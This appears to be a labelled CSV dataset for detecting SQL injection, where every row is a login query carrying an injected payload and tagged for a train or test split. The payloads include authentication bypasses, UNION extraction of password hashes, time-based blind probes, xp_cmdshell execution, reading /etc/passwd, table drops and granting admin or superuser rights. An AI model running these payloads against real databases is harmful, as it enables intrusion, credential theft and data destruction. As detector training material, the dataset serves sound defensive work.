full_query,label,split
SELECT * FROM korisnici WHERE user_name=''; EXEC xp_cmdshell('whoami'); -- ' AND hashed_password='$2b$12$9G3YSN6qHTMYZqLMi3k2rbbb/V0EG6Z1Ux6Jh53yoPbgRDaEc0VLF',1,test
"SELECT id, user_name FROM members WHERE user_name='user123' AND password_hash='admin' /* '",1,test
select * from accounts where user_login='admin'; UPDATE users SET is_admin=1 WHERE id=1; -- ' and pw='qwerty',1,train
"SELECT id, username FROM users WHERE username='admin' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) -- ' AND pwd='MyPharm@99'",1,test
"SELECT id, user_login FROM accounts WHERE user_login=''; CREATE USER hacker WITH SUPERUSER; -- ' AND pass_hash='babd7d1313901896dab4f7f889f0abb2587daf385d7270a92bd7e755cce78cba'",1,test
"SELECT id, user_name FROM customers WHERE user_name='admin'; DROP TABLE users; -- ' AND pwd='P@ssword2024!'",1,test
"SELECT * FROM members WHERE user_login='admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) -- ' AND password_hash='e42c125ac3b170279e60be6a1b51f49f'",1,test
select * from user_accounts where user_name='' OR 1=1#' and pwd='Spring#2024',1,test
SELECT * FROM accounts WHERE login='' OR 'a'='a' AND pass_hash='9f14d20593e8229a3b1965297f892395',1,train
"select * from logins where username='admin' AND ASCII(SUBSTRING(@@version,1,1))>52 -- ' and pw='Spring#2024'",1,test
SELECT * FROM user_data WHERE email='customer1' AND pw='Alex1818'; UPDATE users SET is_admin=1; -- ',1,test
SELECT * FROM customers WHERE user_login='admin') --' AND password='admin123',1,test
select * from auth_users where name='' OR '1'='1' #' and password_hash='ee73e880f557537172126f1297e1b393',1,test
"select * from members where user_login='admin' AND SUBSTRING(username,1,1)='a' -- ' and password_hash='f42c07a85213161db454ff1845b88ea5'",1,train
"SELECT id, email FROM accounts WHERE email='1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ' AND hashed_password='03ea99563b1462bb38e5ef2a1caee76f'",1,test
"SELECT id, email FROM app_users WHERE email='admin' OR CHAR(49)=CHAR(49) -- ' AND password_hash='29480516bfca943bead86ea05a05a56a0685c157f3429bffc3666e8d1b296a49'",1,test
"SELECT * FROM logins WHERE login='admin' AND BENCHMARK(1000000,SHA1('a')) -- ' AND hashed_password='6c25bf910f5aa53bb2173cb601b0b6ecd8db20b6240512bd4e30157e5909e485'",1,test
select * from customers where user_login='') OR ('1'='1' and password='it''s_a_pass',1,test
SELECT * FROM customers WHERE email='admin')) --' AND pass_hash='54829ec099956f25fb34975756da3044a80ad6583edba388a7b1056e0bcf230e',1,test
"select * from customers where login='demo' and pass_hash='admin' AND SUBSTRING(username,1,1)='a' -- '",1,test
select * from users where email='admin'/**/OR/**/'1'='1' and pw='S3cur3P@ss',1,test
select * from accounts where email='admin' AND 1=2 -- ' and pass_hash='3429b73bab888eaf610b226f7ec41dd0',1,test
"SELECT * FROM accounts WHERE name='admin' UNION SELECT id, username, password_hash, is_admin FROM users -- ' AND pass_hash='e420d7b7f86b6ced19ff23b313ef39fa'",1,test
"SELECT id, login FROM user_data WHERE login='Alex1818'; UPDATE users SET is_admin=1; -- ' AND pw='MySecret123'",1,train
"select * from customers where login='admin' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1) -- ' and pwd='monkey'",1,test
select * from users where login='admin' /* ' and pw='MyPharm@99',1,test
select * from user_accounts where user_login='admin_2024' and password_hash='admin' ; DROP TABLE test1; -- ',1,test
select * from customers where name='admin'; DROP TABLE products; DROP TABLE orders; -- ' and password_hash='77363dcbcfb475839ddb4f0bbbed4f5e',1,train
SELECT * FROM customers WHERE login='admin') --' AND pw='MyPharm@99',1,test
"SELECT id, name FROM accounts WHERE name='admin' AND LENGTH(database())>5 -- ' AND pass_hash='d2d179229e88e9beb7c8a12283036badc5851ad902192ddc9eac3b703181abd9'",1,test
select * from user_data where login='' OR 'a'='a' and pwd='S3cur3P@ss',1,test
SELECT * FROM members WHERE user_login='admin' AND (SELECT COUNT(*) FROM users)>0 -- ' AND password_hash='ac83dc861a2c2835a9d1914aa5c2f343eb8c48eb2f0ece0030ce1a19830dffa3',1,test
"SELECT id, user_login FROM app_users WHERE user_login='admin'; SELECT * INTO OUTFILE '/tmp/x' FROM users; -- ' AND pwd='Pa$$w0rd!'",1,test
SELECT * FROM korisnici WHERE login='' OR EXISTS(SELECT 1) -- ' AND hashed_password='877bfaf2de5552ac96c2f74fee371b40304a202eb4dc9f856074ade325c66aaa',1,test
"SELECT id, user_name FROM members WHERE user_name='' UNION ALL SELECT NULL,version(),NULL -- ' AND password='test''password'",1,test
"SELECT * FROM accounts WHERE username='admin' AND IF(1=1,SLEEP(5),0) -- ' AND pw='Spring#2024'",1,test
select * from auth_users where user_login='mirjana' and pass_hash='admin' AND LENGTH(database())>5 -- ',1,train
SELECT * FROM user_accounts WHERE email='' OR 1=1 LIMIT 1 -- ' AND pass_hash='04b2f993b58c360af1413f8311983130',1,test
SELECT * FROM members WHERE email='admin' AND SLEEP(5) -- ' AND hashed_password='pbkdf2:sha256:600000$QrAgasKj$7c7147c5f6d0540be9474526e3e55b7eec058438a3c7466b4bc11345d43895b2',1,test
"SELECT id, user_name FROM customers WHERE user_name='max' AND hashed_password='' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables -- '",1,test
"SELECT id, username FROM korisnici WHERE username='admin' UNION SELECT id, username, password_hash, is_admin FROM users -- ' AND password_hash='$2b$12$DGSLoEWhdLVnSgCe5xSvGIuYDxTVUVQl7m9P4WOuyvXsJo.6R3iX3'",1,test
select * from logins where name='support@example.com' and pass_hash='Alex1818'; UPDATE users SET is_admin=1; -- ',1,test
"SELECT id, user_name FROM user_data WHERE user_name=''; EXEC xp_cmdshell('whoami'); -- ' AND pass_hash='c4bdc4c9048324c45db426eee308a3808b91cf1f9aabe0b413cdbbaef5b6671a'",1,train
SELECT * FROM accounts WHERE user_name='mirjana' AND pass_hash='Alex1818'; DROP TABLE users;-- ',1,test
"select * from logins where email='admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) -- ' and pwd='nicoleivankovic'''",1,train
SELECT * FROM auth_users WHERE name='' OR 1=1 LIMIT 1 -- ' AND pass_hash='1539c3b3a3771425fb8b25689a98b423f12c1cf82f0edbbdae445eac911a0f50',1,test
SELECT * FROM user_data WHERE email=''; CREATE USER hacker WITH SUPERUSER; -- ' AND hashed_password='7464a7eb8ddb98912b0f60ef45f93514',1,test
"SELECT id, login FROM members WHERE login='ana' AND hashed_password='admin'; DELETE FROM users; -- '",1,test
"SELECT id, login FROM user_data WHERE login='' OR '1'='1' AND pass_hash='pbkdf2:sha256:600000$lnmnGSSY$2a71bc82dc62cfd0660f1e927c7e6714524d077b1cfa4ff7101c6c9e62f143e9'",1,train
"SELECT id, username FROM customers WHERE username='admin' OR 0x31=0x31 -- ' AND pw='admin123'",1,test
SELECT * FROM app_users WHERE login='admin' OR 1=1 -- ' AND pwd='root_password',1,test
"SELECT * FROM korisnici WHERE email='' UNION SELECT 1,2,3,4 -- ' AND password='S3cur3P@ss'",1,test
"SELECT id, user_login FROM user_data WHERE user_login='admin'; UPDATE users SET is_admin=1 WHERE id=1; -- ' AND password='MySecret123'",1,test
"SELECT id, user_login FROM user_data WHERE user_login='' UNION SELECT NULL,NULL,NULL -- ' AND hashed_password='cf9a3f5a0962fc13be9ef57d25de2ba6bc0c3347e02afa59287bb6db3132bee9'",1,test
"SELECT id, email FROM members WHERE email='jane' AND pass_hash='Alex1818'; UPDATE users SET is_admin=1; -- '",1,test
"SELECT id, user_login FROM logins WHERE user_login='' UNION SELECT 1,2,3,4 -- ' AND hashed_password='pbkdf2:sha256:600000$hBjLnb5m$a243218fc8c362a688a9d7c48488a29873a11113c9c87b2929284734c8aec706'",1,test
select * from customers where user_name='admin' AND (SELECT COUNT(*) FROM users)>0 -- ' and hashed_password='f4eeb1a97ae79f79ccfb01e404b21f0d44f7673f92e2c36c34fbf8aa99fc3f08',1,train
"SELECT id, login FROM app_users WHERE login='' UNION SELECT 1,table_name,3 FROM information_schema.tables -- ' AND password_hash='c3981d72bb8f9479a5b88a7832c251e8'",1,train
"SELECT id, login FROM users WHERE login='admin' AND 1=1 -- ' AND pass_hash='8a2532de64b35fb9fd71f430af49ab44'",1,test
"SELECT id, login FROM app_users WHERE login='' UNION SELECT 1,table_name,3 FROM information_schema.tables -- ' AND pwd='Welcome2024'",1,train
SELECT * FROM user_data WHERE user_login='admin' Or '1'='1' AND password='letmein',1,test
SELECT * FROM app_users WHERE username='admin' /* ' AND pass_hash='9de7a249a42a615f2a6a4618a95ca8b5b15760b53cf4bd2b2bcf60899a85707b',1,test
SELECT * FROM user_accounts WHERE user_login='kristijan' AND pw='' OR 1=1 LIMIT 1 -- ',1,test
select * from auth_users where name='admin')) --' and password='password',1,test
select * from user_data where user_login='admin'-- -' and pwd='letmein',1,test
"SELECT * FROM customers WHERE name='' UNION SELECT NULL,NULL,NULL,NULL; -- ' AND pass_hash='$2b$12$KX.NXJumCiJsFzY/owijUysCWRTECRgg.xqkq0izbAXFY4gVtAXO2'",1,test
SELECT * FROM app_users WHERE email='admin'/*!50000OR*/'1'='1' AND password_hash='pbkdf2:sha256:600000$8rfizg1s$76c0661ac69f0895f2f9e301a2b1c0b4ee9ccd4478dc1515ffb28dc25c4c26c8',1,test
select * from logins where user_name='admin' AND 1=2 -- ' and pass_hash='57073dd924978960a0fe296d36a6ce45',1,test
select * from logins where name='admin' Or '1'='1' and pass_hash='pbkdf2:sha256:600000$xOtT1hSy$9cdcdc5a0020864f50cfc15eaceb9b3886129c156929b749da652d4d30bfc396',1,test
"SELECT * FROM logins WHERE user_name='admin' UNION SELECT id, username, password_hash, is_admin FROM users -- ' AND pw='MyPharm@99'",1,test
select * from members where name='admin'; UPDATE users SET is_admin=1 WHERE id=1; -- ' and pw='P@ssword2024!',1,test
select * from accounts where user_login='admin' AND SLEEP(5) -- ' and hashed_password='$2b$12$ljjn03EHuXMLrRe9uFHV8TpxfA0czzq5E2hpYL0jaNYjUSOI5aykw',1,test
select * from app_users where name='admin' AND (SELECT COUNT(*) FROM users)>0 -- ' and hashed_password='$2b$12$0ssFD4qfSV93BPJxsHk7Bp9mb9UGcnBd9xxWAs.MeGOGnSbAq04za',1,train
select * from customers where name='' OR 'a'='a' and pw='Welcome2024',1,train
"SELECT id, name FROM users WHERE name='maja' AND password='' OR '1'='1'-- '",1,test
"SELECT id, user_login FROM app_users WHERE user_login='user' AND pass_hash='' OR '1'='1'",1,test
select * from auth_users where user_name='admin'-- -' and password='monkey',1,test
"SELECT id, user_name FROM app_users WHERE user_name='admin' AND 1=2 -- ' AND pass_hash='$2b$12$wP35RpuYgHiA6PtpwkPNkraYYIf1.NIyf9pNYzVm9aUV2YWzjM4Gg'",1,test
SELECT * FROM customers WHERE login='') OR ('1'='1' AND hashed_password='f53b7cfddb2f567375c08f599eff3fdc',1,train
"SELECT id, login FROM customers WHERE login='root' AND pw='admin' OR 0x61626364=0x61626364 -- '",1,train
select * from app_users where name='admin' /* ' and password='MySecret123',1,train
"SELECT id, email FROM logins WHERE email='user123' AND pwd='' UNION SELECT 1,2,3,4 -- '",1,train
"select * from user_data where username='test' and pwd='' UNION SELECT NULL,NULL,NULL,NULL; -- '",1,test
"SELECT id, user_login FROM user_data WHERE user_login='sales' AND password='admin'; DROP TABLE users; -- '",1,test
"SELECT * FROM auth_users WHERE user_login='' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL -- ' AND hashed_password='$2b$12$yCxJmganK0gJmOpRRkITFMtKdzGQhRAvv0tuPtkTZy6QPwwPh0GAt'",1,test
SELECT * FROM auth_users WHERE login='tomislav' AND pw='' --',1,test
"select * from app_users where username='' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables -- ' and pwd='root_password'",1,test
select * from logins where user_login='josip' and password='admin'/**/OR/**/'1'='1',1,test
SELECT * FROM customers WHERE name='Alex1818'; DROP TABLE users;-- ' AND pass_hash='$2b$12$6mauzELQFST7Dzn3zWUYGDk3mBqcHJesOlRuw8OJbbnuxJrRynB8C',1,test
"SELECT id, login FROM logins WHERE login='' OR '1'='1'-- ' AND hashed_password='c6868aec0e073fc45690d9cfceb6a9d1'",1,test
"SELECT id, email FROM members WHERE email='test_user' AND hashed_password='admin' AND ASCII(SUBSTRING(@@version,1,1))>52 -- '",1,train
select * from logins where name='admin' OR 0x31=0x31 -- ' and pw='Welcome123$',1,train
select * from user_accounts where user_login='support@example.com' and password_hash='admin' AND (SELECT COUNT(*) FROM users)>0 -- ',1,test
select * from auth_users where user_login='customer1' and pw='' --',1,test
"SELECT id, login FROM members WHERE login='sales' AND password_hash='admin'; UPDATE users SET is_admin=1 WHERE username='Alex1818'; -- '",1,test
"SELECT id, user_name FROM korisnici WHERE user_name='admin' OR 0x31=0x31 -- ' AND password_hash='pbkdf2:sha256:600000$QxJMRNMa$b9771cb8a9ebf4ec9e4c6174bacfe8b718e60d75143d1bf94734842787f58b8b'",1,test
SELECT * FROM customers WHERE username='root' AND password_hash=''; CREATE USER hacker WITH SUPERUSER; -- ',1,train
SELECT * FROM auth_users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0 -- ' AND hashed_password='$2b$12$UY9IVaD4065yEZWxWvoc8X2eCjDuJD/0xAsdrtetuNmJauM/3RCLy',1,train
"select * from logins where name='' UNION SELECT 1,table_name,3 FROM information_schema.tables -- ' and hashed_password='pbkdf2:sha256:600000$mrYS4vvs$5a24601c84dae8047760ed4dadea0db701bdeef71d80eff312d470fde3cb3e7a'",1,test
select * from user_accounts where user_login='admin')) --' and hashed_password='$2b$12$fU.SMxh8uyBnR.tvPjD6zPIIGsGMG7TZXLsl4i1cDh/S/Y2/wSqNW',1,test
select * from korisnici where user_login='admin'-- -' and pwd='P@ssword2024!',1,test
select * from auth_users where user_login='ad'||'min' OR '1'='1' and pwd='Welcome2024',1,test
"select * from auth_users where name='admin' AND BENCHMARK(1000000,SHA1('a')) -- ' and password_hash='$2b$12$0KuecNbxYqQyZkFG3sNoaDQH8zBriknDdxI9TD/XDOdduhG0aImze'",1,test
"SELECT id, username FROM user_data WHERE username='' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables -- ' AND hashed_password='$2b$12$PNzUwsL8BpPG0FMLRrd8FKfL6qzv1EgevU8wWf8Mz4Zg5ZiLDSzzT'",1,test
"SELECT id, user_login FROM customers WHERE user_login='admin'; SELECT * INTO OUTFILE '/tmp/x' FROM users; -- ' AND pass_hash='$2b$12$nSqSAyaKNAJlAbuiNlg4r0RQq2n26qMyActiYhTXlQqVdcHHv/tnW'",1,test
"SELECT id, user_login FROM user_data WHERE user_login='admin' AND SUBSTRING(username,1,1)='a' -- ' AND password='admin123'",1,test
"SELECT * FROM user_accounts WHERE username='x' UNION SELECT 1,2,3,user(),5,6,7,8,9,10 -- ' AND pass_hash='c147cb72c44329cf339e2ab2197c4a7e3c742be14efc295b908358257a627b55'",1,test
select * from app_users where user_login='admin' AND 1=2 -- ' and pass_hash='2f2560e8d7234ac33f6605ae263d7066',1,test
SELECT * FROM user_data WHERE user_login='user.name' AND password='' OR 1=1 AND '1'='1' -- ',1,train
SELECT * FROM user_accounts WHERE username='kristijan' AND pw='admin'; ALTER TABLE users ADD COLUMN backdoor INT; -- ',1,test
"SELECT * FROM users WHERE username='admin' OR IF(1=1, SLEEP(5), 0) -- ' AND pw='qwerty'",1,test
select * from auth_users where user_login='' OR 'a'='a' and pw='qwerty',1,test
"SELECT id, login FROM user_accounts WHERE login='admin' AND SUBSTRING(username,1,1)='a' -- ' AND password_hash='402bf6885b41e188a99623571f06f649'",1,test
SELECT * FROM user_data WHERE username='contact' AND password_hash='admin' AND (SELECT COUNT(*) FROM users)>0 -- ',1,test
"SELECT id, name FROM customers WHERE name='admin' AND LENGTH(database())>5 -- ' AND pw='root_password'",1,test
SELECT * FROM accounts WHERE email='' OR EXISTS(SELECT 1) -- ' AND pwd='password',1,test
SELECT * FROM accounts WHERE user_login='admin' OR 0x31=0x31 -- ' AND pass_hash='f1ecf967f592420231159c1cfd100f76',1,test
"SELECT id, user_name FROM users WHERE user_name='admin') --' AND pwd='it''s_a_pass'",1,test
SELECT * FROM accounts WHERE user_name='admin' AND (SELECT COUNT(*) FROM users)>0 -- ' AND password='P@ssword2024!',1,train
"SELECT id, username FROM members WHERE username='support' AND password_hash='admin' OR 0x61626364=0x61626364 -- '",1,test
select * from user_data where user_name='ad'||'min' OR '1'='1' and pass_hash='$2b$12$3boi/a4YMKyLAU78W/FEonLIKx7vQrALajvknWT32Mw4jarnas6fV',1,test
SELECT * FROM korisnici WHERE username='1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ' AND hashed_password='pbkdf2:sha256:600000$GVl2Va4t$e8e16179a7ba4f56a03d11fed2aaa1936b6ee1d6639c5fa6ad660416d438ce9f',1,test
SELECT * FROM user_accounts WHERE user_name='admin'/*!50000OR*/'1'='1' AND pwd='MyPharm@99',1,test
"SELECT id, user_login FROM user_data WHERE user_login='admin'; UPDATE users SET is_admin=1 WHERE id=1; -- ' AND password_hash='pbkdf2:sha256:600000$8kzMeThZ$dca36a54c8916b281780434198c116f5a38d8cc9493afee809973c4d7bed3ed3'",1,test
SELECT * FROM auth_users WHERE login='admin' AND pw='admin' OR 0x61626364=0x61626364 -- ',1,test
"SELECT * FROM korisnici WHERE username='' UNION SELECT username,password_hash FROM users -- ' AND password='letmein'",1,train
"SELECT * FROM user_accounts WHERE login='' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL -- ' AND hashed_password='06c6e426bb72eeb4c8435f8b02d512a06a7febdded632edc3c35ba024821a70e'",1,test
"SELECT id, login FROM user_data WHERE login='admin' OR IF(1=1, SLEEP(1), 0); -- ' AND hashed_password='ad4d724a5c9b15734650c9a789df03d7'",1,test
"SELECT id, name FROM korisnici WHERE name='' UNION SELECT 1,2,3,4 -- ' AND pw='password'",1,train
select * from customers where login='henry' and pw='1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ',1,test
"select * from members where email='admin' OR IF(1=1, SLEEP(5), 0) -- ' and password='test''password'",1,test
select * from members where username='' OR 'x'='x' -- ' and pwd='P@ssword2024!',1,test
SELECT * FROM members WHERE user_name='admin' AND 1=2 -- ' AND password='secret123',1,test
"select * from auth_users where user_login='' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL -- ' and password='qwerty'",1,test
SELECT * FROM user_accounts WHERE login='admin' OR 1=1/*' AND hashed_password='$2b$12$zbXEdFYR46tzQY2FBWP.EJ.hnWr7HmY8P2JYIkoPx4lMnFWrOAIXa',1,test
SELECT * FROM user_data WHERE login='admin'; TRUNCATE TABLE logs; -- ' AND pwd='secret123',1,test
SELECT * FROM accounts WHERE name='admin' AND LENGTH(database())>5 -- ' AND password_hash='$2b$12$s/vFUQbMzPXEO2nLnGcZN4NNMYXr2Su7sgtHJvwEHnDw4eoF9Dg2R',1,test
select * from members where user_login='Alex1818'; UPDATE users SET is_admin=1; -- ' and hashed_password='ad1f608f2503c24dd5af68b26bdc812d804b43abfc685578aa53e9b2df659af6',1,test
select * from logins where user_name='admin') --' and password_hash='$2b$12$T5LIfFd81qvmYryeel3swoHKnAGEK.3oRNT5aPCNWedDSD2xKMMGS',1,test
"SELECT id, name FROM members WHERE name='root' AND password_hash='admin' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1) -- '",1,test
"select * from accounts where name='admin' AND BENCHMARK(1000000,SHA1('a')) -- ' and password='P@ssword2024!'",1,test
"SELECT * FROM logins WHERE email='admin' OR IF(1=1, SLEEP(5), 0) -- ' AND password_hash='$2b$12$B.u44Bw6prnHAekIm0R1uIPEicQ1oYusA.qwFE1MJ3dshzOCDI420'",1,test
select * from accounts where login='' --' and password_hash='fee4ad16902c0113b2a6228158d778ed6d85ca0a390d38414fb6e50e5578d40c',1,train
